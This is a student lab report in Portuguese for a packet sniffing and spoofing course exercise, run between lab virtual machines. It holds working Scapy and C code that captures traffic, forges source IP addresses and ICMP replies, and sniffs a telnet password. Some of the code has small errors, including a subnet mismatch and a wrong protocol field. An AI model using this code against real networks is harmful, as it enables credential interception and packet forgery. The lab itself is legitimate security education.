# Laboratório 5 - Packet Sniffing and Spoofing

### Felipe Junio Rezende - 11711ECP007

### Murilo Guerreiro Badoco - 11711ECP010

## Tarefa 1 - Using Tools to Sniff and Spoof Packets

Para essa tarefa foram utilizadas duas VM's, uma para o atacante com o *IP Address:* `10.0.2.5` e uma para simular um sevidor, com o *IP Address:* `10.0.2.6`, ambas conectadas à rede por meio da Rede NAT.

### Tarefa 1.1A - Sniffing Packets

O objetivo era realizar o farejamento de pacotes utilizando a ferramenta Scapy em programas Python. Para isso, utilizamos o código Python a seguir:

```python
#!/usr/bin/python3

from scapy.all import *

def print_pkt(pkt):
	pkt.show()

pkt = sniff(filter='icmp',prn=print_pkt)
```

Abaixo, executamos o código com os níveis de permissão do usuário seed e nos foi retornado uma mensagem de erro. Em seguida, utilizamos os privilégios de superusuário, colocando então o Script em execução, pronto para interceptar qualquer pacote enviado na rede:

!Packet-Sniffing-and-Spoofing-Images/Untitled.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled.png)

### Tarefa 1.1B

- Capturar somente pacotes ICMP

Para essa tarefa, realizamos o ping para o IP da nossa outra VM (Servidor) em um novo terminal. Assim, foi possível capturar os pacotes ICMP trafegados na rede e obter a descrição dos mesmos. As figuras abaixo mostram a requisição e resposta do servidor, respectivamente:

!Packet-Sniffing-and-Spoofing-Images/Untitled%201.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%201.png)

!Packet-Sniffing-and-Spoofing-Images/Untitled%202.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%202.png)

- Capturar somente pacotes TCP vindos de um IP específico destinado à porta 23

Realizamos a seguinte alteação no código para realizar sniffing requerido:

```python
pkt = sniff(filter='tcp and dst port 23 and src host 10.0.2.4',prn=print_pkt)
```

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_10-36-22.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_10-36-22.png)

Obtivemos a resposta abaixo oriunda do pacote TCP recebido:

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_10-38-20.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_10-38-20.png)

- Capturar pacotes vindo ou indo para uma sub-rede específica.

Para essa tarefa, alteramos o código **sniffer.py** novamente, para filtrar os pacotes vindo ou indo para o IP `194.17.96.0/24`

```python
pkt = sniff(filter='dst net 104.17.96.0/24',prn=print_pkt)
```

O resultado da captura é mostrado a seguir:

!Packet-Sniffing-and-Spoofing-Images/Untitled%203.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%203.png)

### Tarefa 1.2 - Spoofing ICMP Packets

Para essa tarefa, foi necessário manter o Wireshark aberto, capturando pacotes trafegados na rede. Em seguida, em um terminal do Python e inserimos o seguinte código, para montar uma requisição de um pacote ICMP e enviá-la ao IP de destino:

```python
>>> from scapy.all import *
>>> a = IP()
>>> a.dst = '10.0.2.6'
>>> b = ICMP()
>>> p = a/b
>>> send(p)
```

Com isso, observamos que a requisição foi aceita e um pacote foi enviado de volta para o IP da VM principal, como mostra o resultado abaixo:

!Packet-Sniffing-and-Spoofing-Images/Untitled%204.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%204.png)

Utilizando o comando `ls(a)` podemos visualizar todos os atributos referentes ao pacote enviado:

!Packet-Sniffing-and-Spoofing-Images/Untitled%205.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%205.png)

### Tarefa 1.3 - Traceroute

O objetivo da tarefa era implementar uma ferramenta de Traceroute
utilizando um código Python, que consiste em montar um pacote ICMP e
enviar a um endereço IP específico, no caso, escolhemos o do Google
172.217.162.196. O código ficou assim:

```python
#!/usr/bin/python3

from scapy.all
import *
a = IP(dst =
'172.217.162.196', ttl = 11)
b = ICMP()
p = a/b
send(p)
```

Fizemos vários testes, incrementando o valor de TTL, e por meio do Wireshark, verificamos se o pacote chegou ao destino e se esse enviava uma resposta. Por fim, a quantidade mínima de saltos que foram feitos desde a VM até o destino deu 11. O resultado obtido foi esse:

!Packet-Sniffing-and-Spoofing-Images/Untitled%206.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%206.png)

### Tarefa 1.4

O objetivo era implementar um programa que faz o farejamento de pacotes, e quando um pacote é enviado de um Host, é retornado para ele um pacote por meio da técnica de Spoofing. O código ficou assim:

```python
#!/usr/bin/python3
from scapy.all import *

def spoof_pkt(pkt):
        if ICMP in pkt and pkt[ICMP].type == 8:
                print("Original Packet...")
                print("Source IP: ", pkt[IP].src)
                print("Destination IP: ", pkt[IP].dst)

                ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
                icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
                data = pkt[Raw].load
                newpkt = ip/icmp/data

                print("Spoofed Packet...")
                print("SOurce IP:", newpkt[IP].src)
                print("DEstination IP: ",newpkt[IP].dst)
                send(newpkt,verbose=0)

pkt = sniff(filter='icmp and src host 10.0.2.6',prn=spoof_pkt)
```

Em seguida, na VM A, fizemos um ping para o IP 10.0.2.2 e verificamos que a técnica foi realizada com sucesso:

!Packet-Sniffing-and-Spoofing-Images/Untitled%207.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%207.png)

!Packet-Sniffing-and-Spoofing-Images/Untitled%208.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Untitled%208.png)

## Tarefa 2

```c
void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
 struct ethheader *eth = (struct ethheader*)packet;
 if(ntohs(eth->ether_type) == 0x0800) {
 struct ipheader *ip = (struct ipheader*)(packet + sizeof(struct ethheader));
 printf("Source IP: %s\t", inet_ntoa(ip->iph_sourceip));
 printf("Destin IP: %s\n", inet_ntoa(ip->iph_destip));
 }
}
```

### Tarefa 2.1A - Entendendo como um sniffer funciona

### Pergunta 1

Para capturar os pacotes primeiro iniciamos uma sessão utilizando a função `pcap_open_live` provida pela biblioteca **pcap**, ela utiliza o hardware de rede para estabelecer uma conexão promíscua desta forma possibilitando o sniffing do pacotes. Em sequência iniciamos a captura de pacotes utilizando um filtro previamente definido com a função `pcap_compile` . Por fim os pacotes são recebidos em um loop através da função pcap_loop que recebe infinitamente os pacotes da sessão. Quando terminada a captura o `pcap_close` fecha a sessão.

### Pergunta 2

Faz-se necessário utilizar os privilégio de superusuário, pois utilizamos o modo promiscuo na função `pcap_open_live` , se desabilitarmos a permissão de superusuário não será possível utilizar esta funcionalidade

### Pergunta 3

O modo promíscuo indica ao hardware da interface de rede que envie todos os dados recebidos para a CPU ao invés do que foi especificado pelo programa para ser recebido. É possível observar este comportamento por meio de uma terceira máquina realizando o sniffing da interface de rede na comunicação entre duas outras. Sem o modo promiscuo nada seria capturado.

### Tarefa 2.1B - Definindo filtros

- Capturar pacotes ICMP entre 2 máquinas

Realizamos o ping de uma máquina cujo IP é `10.0.2.4` na máquina de destino `10.0.2.15`

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_15-08-27.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_15-08-27.png)

- Capturar pacotes TCP com destino

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_16-01-31.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_16-01-31.png)

### Tarefa 2.1C - Sniffing Passwords

Nesta tarefa utilizamos o Scapy com o seguinte código

```python
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re

def packet_callback(packet):
    if packet[TCP].payload:
        print(packet[TCP].payload)

sniff(filter="tcp and src host 10.0.2.4", prn=packet_callback, store=0)
```

Desta forma ao estabelecer uma conexão telnet a partir de outra máquina virtual conseguimos descobrir a senha

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_19-39-42.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_19-39-42.png)

### Tarefa 2.2A - Escrever um programa de Spoofing

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "myheader.c"

void send_raw_ip_packet(struct ipheader* ip)
{
	struct sockaddr_in dest_info;
	int enable = 1;
	//Step1: Create a raw network socket
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	//Step2: Set Socket option
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	//Step3: Provide destination information
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	//Step4: Send the packet out
	sendto(sock, ip, ntohs(ip->iph_len),0, (struct sockaddr *)&dest_info, 
				sizeof(dest_info));
	close(sock);
}

void main() {

	char buffer[1500];
	memset(buffer, 0, 1500);

	struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
	char *data = buffer + sizeof(struct ipheader) + sizeof(struct udpheader);
	char *msg = "Hello!!\n";
	int data_len = strlen(msg);
	memcpy(data, msg, data_len);

	udp->udp_sport=htons(9190);
	udp->udp_dport=htons(9090);
	udp->udp_ulen=htons(sizeof(struct udpheader) + data_len);
	udp->udp_sum=0;

	struct ipheader *ip = (struct ipheader *)buffer;
	ip->iph_ver=4;
	ip->iph_ihl=5;
	ip->iph_ttl=20;
	ip->iph_sourceip.s_addr = inet_addr("6.6.6.6");
	ip->iph_destip.s_addr = inet_addr("10.0.2.4");
	ip->iph_protocol = IPPROTO_UDP;
	ip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct udpheader) + data_len);

	send_raw_ip_packet(ip);

}
```

Nesta tarefa com o auxilio do código fornecido pelo roteiro realizamos alterações para que fosse visível que o pacote enviado em questão se trata de um pacote falso, o IP do pacote enviado pela VM de IP `10.0.2.15` consta como `6.6.6.6` , como é possível ver na imagem abaixo.

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_20-58-17.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_20-58-17.png)

### Tarefa 2.2B - Falsificar um pacote ICMP

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "myheader.c"

unsigned short in_cksum (unsigned short *buf, int length)
{

	unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

     if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16 
   sum += (sum >> 16);                  // add carry 
   return (unsigned short)(~sum);

}

void send_raw_ip_packet(struct ipheader* ip)
{
	struct sockaddr_in dest_info;
	int enable = 1;
	//Step1: Create a raw network socket
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	//Step2: Set Socket option
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	//Step3: Provide destination information
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	//Step4: Send the packet out
	sendto(sock, ip, ntohs(ip->iph_len),0, (struct sockaddr *)&dest_info, 
					sizeof(dest_info));
	close(sock);
}

void main() {

	char buffer[1500];
	memset(buffer, 0, 1500);

	/***** Preparing the ICMP Header *****/
	struct icmpheader *icmp = (struct icmpheader *) (buffer + sizeof(struct ipheader));
	icmp->icmp_type = 8; //8 is for  request and 0 is for reply
	icmp->icmp_chksum = 0;
	icmp->icmp_chksum = in_cksum((unsigned short *)icmp, sizeof(struct icmpheader));

	/***** Preparing the IP Header *****/
	struct ipheader *ip = (struct ipheader *)buffer;
	ip->iph_ver=4;
	ip->iph_ihl=5;
	ip->iph_ttl=20;
	ip->iph_sourceip.s_addr = inet_addr("10.0.2.4");
	ip->iph_destip.s_addr = inet_addr("10.0.2.3");
	ip->iph_protocol = IPPROTO_UDP;
	ip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct udpheader));

	send_raw_ip_packet(ip);

}
```

Quando o máquina atacante, isto é com IP 10.0.2.15, envia um o pacote falsificado com o IP da vitima a mesma responde no IP que está como de origem no pacote, ao invés da requisição ocorrer normalmente com a vítima respondendo o IP do atacante.

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_21-10-31.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_21-10-31.png)

### Pergunta 4

Sim é possível definir o tamanho da mensagem para qualquer valor arbitrário através do payload do pacote.

### Pergunta 5

Não o campo checksum apenas foi necessário na falsificação dos pacotes ICMP

### Pergunta 6

Sem os privilégios de root não seria possível definir o funcionamento normal do programa, pois ele utiliza o modo promíscuo e como dito anteriormente para que funcione é necessário esta autorização.

## Tarefa 2.3 Sniff e Spoof

```c
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h> 
#include <unistd.h> 
#include "myheader.c"

void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, 
                     &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0, 
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

void send_echo_reply(struct ipheader * ip)
{
  int ip_header_len = ip->iph_ihl * 4;
  const char buffer[PACKET_LEN];

  memset((char*)buffer, 0, PACKET_LEN);
  memcpy((char*)buffer, ip, ntohs(ip->iph_len));
  struct ipheader* newip = (struct ipheader*)buffer;
  struct icmpheader* newicmp = (struct icmpheader*)(buffer + ip_header_len);

  newip->iph_sourceip = ip->iph_destip;
  newip->iph_destip = ip->iph_sourceip;
  newip->iph_ttl = 64;

  newicmp->icmp_type = 0;

  send_raw_ip_packet (newip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, 
        const u_char *packet)
{
  struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) { 
    struct ipheader * ip = (struct ipheader *)
                           (packet + sizeof(struct ethheader)); 
    printf(" From: %s\n", inet_ntoa(ip->iph_sourceip));  
    printf(" To: %s\n", inet_ntoa(ip->iph_destip));   

  }
}

int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  
  char filter_exp[] = "icmp[icmptype] = 8";
  
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with name eth3
  handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); 

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);      
  pcap_setfilter(handle, &fp);                             

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);                

  pcap_close(handle);   //Close the handle 
  return 0;
}
```

Nesta tarefa a máquina virtual atacante também está em modo promíscuo, o programa captura os pacotes e realiza a falsificação do pacote ICMP de forma semelhante à tarefa 2.2B trocando sua origem.

!Packet-Sniffing-and-Spoofing-Images/Screenshot_from_2021-05-14_23-08-55.png](Laborato%CC%81rio%205%20-%20Packet%20Sniffing%20and%20Spoofing%203d7763436f92451490ceea17c1c06255/Screenshot_from_2021-05-14_23-08-55.png)
